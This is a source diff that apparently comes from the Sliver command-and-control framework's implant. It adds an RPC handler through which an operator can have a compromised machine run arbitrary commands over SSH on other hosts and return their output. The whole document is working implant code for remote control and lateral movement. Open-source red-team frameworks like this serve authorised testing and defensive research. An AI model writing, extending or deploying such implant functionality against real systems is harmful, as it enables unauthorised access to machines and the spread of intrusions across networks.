@@ -39,6 +39,7 @@ import (
 	// {{if .Config.WGc2Enabled}}
 	"github.com/bishopfox/sliver/implant/sliver/forwarder"
 	// {{end}}
+	"github.com/bishopfox/sliver/implant/sliver/shell/ssh"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -522,6 +523,31 @@ func pollIntervalHandler(data []byte, resp RPCResponse) {
 	}
 
 	data, err = proto.Marshal(pollIntervalResp)
+	resp(data, err)
+}
+
+func runSSHCommandHandler(data []byte, resp RPCResponse) {
+	commandReq := &sliverpb.SSHCommandReq{}
+	err := proto.Unmarshal(data, commandReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %s\n", err.Error())
+		// {{end}}
+		return
+	}
+	stdout, stderr, err := ssh.RunSSHCommand(commandReq.Hostname,
+		uint16(commandReq.Port),
+		commandReq.Username,
+		commandReq.Command)
+	commandResp := &sliverpb.SSHCommand{
+		Response: &commonpb.Response{},
+		StdOut:   stdout,
+		StdErr:   stderr,
+	}
+	if err != nil {
+		commandResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(commandResp)
 	resp(data, err)
 }
 
